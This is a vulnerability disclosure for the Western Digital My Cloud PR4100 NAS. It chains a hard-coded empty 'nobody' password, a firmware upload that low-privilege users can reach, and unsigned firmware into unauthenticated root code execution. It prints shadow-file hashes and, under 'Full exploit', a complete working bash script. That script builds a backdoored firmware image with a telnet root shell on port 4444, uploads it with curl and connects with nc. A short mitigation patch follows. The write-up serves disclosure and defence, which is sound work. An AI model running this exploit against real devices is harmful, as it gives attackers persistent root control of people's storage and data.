weekend_destroyer
=======
***

# Summary

This document describes a chain of vulnerabilities that were found by **Pedro Ribeiro ([@pedrib1337](https://twitter.com/pedrib1337) | pedrib@gmail.com)** and **Radek Domanski ([@RabbitPro](https://twitter.com/RabbitPro) | radek.domanski@gmail.com)** and *intended to be presented* at [Zero Day Initiative](https://www.zerodayinitiative.com/) **Pwn2Own Tokyo 2020** competition in November 2020.

The vulnerabilities described in this document are present in the network attached storage (NAS) device **Western Digital My Cloud Pro Series PR4100** ([PR4100](https://shop.westerndigital.com/products/network-attached-storage/wd-my-cloud-pro-series-pr4100)), on firmware versions up to and including 2.40.157.

The default configuration is exploitable by an unauthenticated attacker, who can achieve remote code execution as root on the PR4100. The exploit creates a persistent backdoor, which gives the attacker full control of the device even after a reboot.

The exploit chains three vulnerabilities to achieve code execution:

* [CVE-2021-36224](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-36224): Hard-coded User Credentials
* [CVE-2021-36225](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-36224): Firmware Upgrade Can be Initiated by Low Privilege User
* [CVE-2021-36226](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-36224): No Cryptographic Verification of Firmware Upgrades

All code snippets in this advisory were obtained from files in firmware version 2.40.155.

## Western Digital, the Party Poopers

Less than one week before the Pwn2Own competiton, WD released a entirely new operating system, OS version 5, which replaced OS version 3. This was certainly not a coincidence, as WD was listed as one of the ZDI "partners" for Pwn2Own.

The new operating system is completely different, and it killed off the vulnerabilities listed below, as well as many other vulnerabilities discovered by other competitors.
While fixing or killing vulnerabilities is a good thing, we believe that it was WD's intention to trip up all Pwn2Own competitors, and then claim "victory" by saying their product is secure and was not hacked at the competition.

While we did not have time to find new vulnerabilities in OS 5, other competitors did, and WD's evil plan was foiled - they were still humbled by a series of vulnerabilities disclosed at the competition.

However, it seems that OS 5 was released in such a rush that it didn't even implement some basic features expected by users of OS 3, and some device models running OS 3 were not supported at all. 

We highly recommend that you watch [our video that explains all of these vulnerabilities](https://www.youtube.com/watch?v=vsg9YgvGBec) in detail, as well as the drama surrounding it, which is also detailed in a [Krebs On Security article](https://krebsonsecurity.com/2021/07/another-0-day-looms-for-many-western-digital-users/).

[![Exploiting (and Patching) a Zero Day RCE Vulnerability in a Western Digital NAS](https://img.youtube.com/vi/vsg9YgvGBec/0.jpg)](https://www.youtube.com/watch?v=vsg9YgvGBec)

# Vulnerability Details

## Background on PR4100 HTTP services

The PR4100 device exposes a number of services to the local network. There is an Apache *httpd* server running on ports 80 and 443, which hosts the main administrative web application and a REST API.

The REST API is the main component that we have abused to exploit the device.
It is accessible at */api/2.1/rest/\** and it exposes various API endpoints that are used for a variety of tasks, from managing data stored in the device, to accessing it, managing system properties of the device, etc. Each endpoint has different permissions such as the ones shown below:

* NO_AUTH
* USER_AUTH
* ADMIN_AUTH_LAN

The permissions are self explanatory, but the first one requires no authentication to access, the second one only authenticated users can access, while the last one is only accessible to administrative users. Each endpoint can be configured to respond to different HTTP verbs such as GET, POST, etc, and access is controlled by tagging it with one or more of the permissions shown above.

## Vulnerability 1: Hard-coded User Credentials

The first vulnerability we have identified in PR4100 was the usage of various hard-coded credentials for a number of users in the system. The contents of */etc/shadow* are shown below:

```
root:$1$$HTjCpuPOAkaXeDD7e2p.5.:14746:0:99999:7:::
sshd:$1$$HTjCpuPOAkaXeDD7e2p.5.:14746:0:99999:7:::
admin:$1$$CoERg7ynjYLsj2j4glJ34.:15882:0:99999:7:::
nobody:$1$$qRPK7m23GJusamGpoGLby/:15882:0:99999:7:::
squeezecenter:$1$$o7vIitnZu4MHlaR5S90M/1:15460:0:99999:7:::
```

The *root*, *sshd* and *admin* passwords are set when the device is configured for the first time, and therefore unique to each device. However, users *nobody* and *squeezecenter* have fixed passwords, which are the same across multiple firmware versions. These passwords are embedded in the firmware updates, therefore they are the same in every PR4100 device.

These passwords are trivial to crack using wordlists and rainbow tables due to the usage of a weak hashing algorithm (*md5crypt*) with no salting. After we ran these through a password cracker, the *nobody* password was found in seconds - it is actually an empty password ("").

We briefly attempted to crack the *squeezecenter* password but were unable to with a simple dictionary. We believe this password is easily crackable by bruteforcing with a GPU, AWS or other cloud password cracking mechanism. However this was unnecessary, since we could exploit the device with the *nobody* user, so it was not attempted.


## Vulnerability #2: Firmware Upgrade Can be Initiated by Low Privilege User

While the *nobody* user could not login via the web interface, it could perform *USER_AUTH* (authenticated user) actions in the REST API. After auditing the REST API code for interesting calls, we found one that triggers a firmware update:

```php
    /**
     * \par Description:
     * Causes NAS to update to firmware in file that is copied to the device.
     *
     * \par Security:
     * - Requires user authentication (LAN/WAN)
     *
     * \par HTTP Method: POST
     * - http://localhost/api/@REST_API_VERSION/rest/firmware_update
     *
     * \par HTTP POST Body
     * - filepath=/CacheVolume/filename
     *
     * \param filepath  String - optional
     * \param format    String - optional
     *
     * \par Parameter Details:
     * - filepath:   If filepath is not specified, file is assumed to be streamed as part of the http POST.
     *
     * \retval status String - success
     *
     * \par HTTP Response Codes:
     * - 200 - On successful updation of the firmware
     * - 400 - Bad request, if parameter or request does not correspond to the api definition
     * - 401 - User is not authorized
     * - 403 - Request is forbidden
     * - 404 - Requested resource not found
     * - 500 - Internal server error
     *
     * \par Error Codes:
     * - 177 - FIRMWARE_UPDATE_BAD_REQUEST - Firmware update bad request
     * - 178 - FIRMWARE_UPDATE_INTERNAL_SERVER_ERROR - Firmware update internal server error
     *
     * \par XML Response Example:
     * \verbatim
      <firmware_update>
      <status>success</status>
      </firmware_update>
      \endverbatim
     */
    public function post($urlPath, $queryParams = null, $outputFormat = 'xml') {

        if (!isset($queryParams['filepath']) && isset($_FILES['file']['tmp_name'])) {
            $queryParams["filepath"] = "/CacheVolume/" . $_FILES['file']['name'];
            move_uploaded_file($_FILES['file']['tmp_name'], $queryParams['filepath']);
        }

        $fwUpdateObj = new Model\Firmware();
        $result = $fwUpdateObj->manualFWUpdate($queryParams);

        switch ($result) {
            case 'SUCCESS':
                $results = array('status' => 'success');
                $this->generateSuccessOutput(200, 'firmware_update', $results, $outputFormat);
                break;
            case 'BAD_REQUEST':
                throw new \Core\Rest\Exception('FIRMWARE_UPDATE_BAD_REQUEST', 400, NULL, self::COMPONENT_NAME);
            case 'SERVER_ERROR':
                throw new \Core\Rest\Exception('FIRMWARE_UPDATE_INTERNAL_SERVER_ERROR', 400, NULL, self::COMPONENT_NAME);
        }
    }
```

> Snippet 1: *Update.php::post()* firmware_update POST REST API endpoint

We can see that it accepts a multipart file upload and then moves it to */CacheVolume*. At the time we thought this would allow us to write to an arbitrary directory using path traversal, but it seems that PHP sanitises the upload filename in the *$\_FILES* array, so this was not possible.

The filename is then passed to *manualFWUpdate()*, which is shown below:

```php
    public function manualFWUpdate($changes) {

        if (!isset($changes['filepath'])) {
            return 'BAD_REQUEST';
        }

        $output=$retVal=null;
		$escFirmwareArg = escapeshellarg($changes["filepath"]);
        exec_runtime("sudo nohup /usr/local/sbin/updateFirmwareFromFile.sh $escFirmwareArg 1>/dev/null 2>&1 &", $output, $retVal, false);

        return 'SUCCESS';
    }
```

> Snippet 2: *Firmware.php::manualFWUpdate()*

In this snippet, the *filepath* shell argument is escaped, which avoids command injection, but then it is passed to */usr/local/sbin/updateFirmwareFromFile.sh*, which is shown below:

```shell
#!/bin/sh
#
# Modified by Alpha_Hwalock, for LT4A
#
# updateFirmwareFromFile.sh <filename> [check_filesize]"
# 
# <return>	 1:	shell script check failure
#			 0: success
#			-1: upload_firmware return fail

PATH=/sbin:/bin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin

. /etc/nas/alert-param.sh

filename=${1}
check_size=${2:-""}
upFwPathPrefix="/usr/local/upload/"

# check params
if [ $# -lt 1 ]; then
    echo "usage: updateFirmwareFromFile.sh <filename> [check_filesize]"
    exit 1
fi
if [ ! -f ${filename} ]; then
    echo "File not found"
    exit 1
fi

# hwalock: check file size
if [ "${check_size}" != "" ]; then
    FileSize=`cat /tmp/fw_upgrade_filesize`
    blocksize_ls=`ls -l ${filename} | awk '{print $5}'`
    if [ "${FileSize}" != "${blocksize_ls}" ]; then
        echo "failed 202 \"failed download file size check\"" | tee /tmp/fw_update_status
		exit 1
    fi
fi


upload_firmware -c auto
cp -f ${filename} /usr/local/upload/newFirmware

touch /tmp/upload_fw
upload_firmware -n newFirmware
status=$?

do_reboot &
#alert_test -a ${rebootRequired} -f&

exit ${status}
```

> Snippet 3: */usr/local/sbin/updateFirmwareFromFile.sh*

Here we can see that the firmware file we have uploaded is copied to */usr/local/upload/newFirmware* and then *upload_firmware* is invoked.

*upload_firmware* is an executable file that performs integrity checks on the firmware file, and then if all checks are passed, flashes the file to the eMMC memory chip.

In order to access this API with the *nobody* user, we simple have to send the following POST request:

```
POST /api/2.1/rest/firmware_update?auth_username=nobody&auth_password=

< ... multipart file upload ...>
```

Recall that *nobody* has an empty password, hence why it will allow access to this authenticated endpoint.

We believe this is a critical flaw - why is a unprivileged user allowed to upload firmware files and initiate firmware upgrades? This functionality should only be performed by administrative users.

## Vulnerability #3: No Cryptographic Verification of Firmware Upgrades

In order to have secure firmware upgrades, a firmware upgrade file should be signed by device vendor in order for the device to verify its authenticity.
Unfortunately for Western Digital, that is not the case for the PR4100 device.

The final part of the upgrade process is when *upload_firmware* is invoked. This binary does simple integrity checks such as checksums, verifying magic numbers, etc, but no cryptographic verification of the uploaded firmware.

This means that any firmware upgrade file that is received and passes the integrity checks will be flashed onto the device. 

# Exploitation

As shown in the previous sections, we can access the authenticated REST API endpoints with the default user *nobody* and use the *firmware_update* API endpoint to upload a firmware file to the device. As long as this file passes the integrity checks, it will be flashed onto the device.

To create a valid firmware file we can use the PR4100 GPL code. This code contains tools to build firmware images that are accepted by the device, and saved us a lot of time of reverse engineering on how to build a valid firmware file.

There are multiple ways to achieve code execution since we fully control the firmware file that is flashed onto the device. We chose to replace the UPNP daemon *upnp_nas_device*, which is called at every boot, with a shell script that spawns an unauthenticated telnet root shell on port 4444.

The firmware file is then uploaded to the device and after a few minutes of upgrading and rebooting, we can connect to port 4444 on the device and get our root shell:

```
BusyBox v1.20.2 (2019-07-04 10:39:50 CST) built-in shell (ash)
Enter 'help' for a list of built-in commands.

root@MyCloudPR4100 / # id
uid=0(root) gid=0(root)
root@MyCloudPR4100 / # uname -a
Linux MyCloudPR4100 4.1.13 #1 SMP Mon Jun 29 00:11:44 PDT 2020 Build-git249a60f x86_64 GNU/Linux
root@MyCloudPR4100 / #
```

By flashing the stock firmware we can revert our changes and "unbackdoor" the device.

## Full exploit

The full end-to-end exploit is shown below. This exploit builds the backdoored firmware image, uploads it to the device and then connects to the root reverse shell. The exploit takes a minimum of 5 minutes to run, depending on the network and CPU speed of the computer running the exploit. It is recommended to run the exploit in a Kali, Debian or Ubuntu machine that can run 32 bit binaries.

In the Pwn2Own competition, our intention was to use a shortened version that uploaded a pre-built backdoored firmware image instead. This shortened version consists of steps 6 and 7 of the exploit below, and takes a maximum of 3 minutes and 30 seconds to run in order to fit the competition's time limits (5 minutes per attempt).

```shell
#!/bin/bash

echo "> weekend_destroyer: exploit for Western Digital MyCloud PR4100 for Pwn2Own Tokyo 2020 by"
echo "  Pedro Ribeiro (@pedrib1337 | pedrib@gmail.com)"
echo "  Radek Domanski (@RabbitPro | radek.domanski@gmail.com)"
echo ""

if [ $# -eq 0 ]; then
    echo "> Usage: ./weekend_destroyer.sh <RHOST>"
    exit 1
fi

# replace these vars for new firmware versions, the rest of the code should work as-is
FW_VERSION="2.40.155"
FW_GPL="WDMyCloud_PR4100_GPL_v2.40.155_20200713"

RHOST="$1"
echo "> Attacking $RHOST"

echo "> 1: Downloading GPL code"
wget https://downloads.wdc.com/gpl/$FW_GPL.tar.gz
tar xf $FW_GPL.tar.gz
cd $FW_GPL/

echo "> 2: Modifying firmware version"
cd firmware/module
sed -i "s/$FW_VERSION/2.99.999/g" crfs/default/config.xml

echo "> 3: Creating backdoor in root filesystem"
cd crfs/bin
mv upnp_nas_device upnp_nas_device.old
cat <<'EOF' >> upnp_nas_device
#!/bin/sh
PS=`ps faux | grep utelnetd | grep -v grep`
if [ -z "$PS" ]; then
  utelnetd -d -l /bin/sh -p 4444
fi
EOF
chmod +x upnp_nas_device
cd ../../

echo "> 4: Building root filesystem (requires sudo to install lib32z1)"
sudo apt install lib32z1
./create_image.sh
sleep 0.5
rm ../merge/image.cfs
mv image.cfs ../merge/

echo "> 5: Building firmware image"
cd ../merge && ./merge

echo "> 6: Sending firmware update"
curl -vv -X POST -F 'file=@WD-NAS-firmware' "http://$RHOST/api/2.1/rest/firmware_update?auth_username=nobody&auth_password="

echo ""
echo "> 7: Now sit back and wait for Shelly, she takes around 3 minutes to arrive!"
while true; do 
  sleep 1
  nc $RHOST 4444 2>/dev/null
  if [ $? -eq 0 ]; then
    break
  else
    echo -n "."
  fi
done

echo "> Exploit finished"
```

## Patch

We are also publishing a patch to fix this issue (since Western Digital refuses to do so). However, this patch is not permanent and needs to be applied at every reboot.

```bash
#!/bin/bash

echo "> weekend_destroyer_patch: patch for 0 day sploit by"
echo "  Pedro Ribeiro (@pedrib1337 | pedrib@gmail.com)"
echo "  Radek Domanski (@RabbitPro | radek.domanski@gmail.com)"
echo "v0.1, released 25/02/2021"
echo ""

echo "> Patching vulnerability and restarting httpd..."

# Yup, this is the only POST with USER_AUTH in the whole file, so this is safe
sed -i 's/<post>USER_AUTH<\/post>/<post>ADMIN_AUTH<\/post>/' /var/www/rest-api/api/System/config/module.config.xml
killall httpd
sleep 1
httpd -f /usr/local/apache2/conf/httpd.conf -k graceful &
sleep 1

echo "> Vulnerability patched. Don't forget to run this script at every reboot!"
```
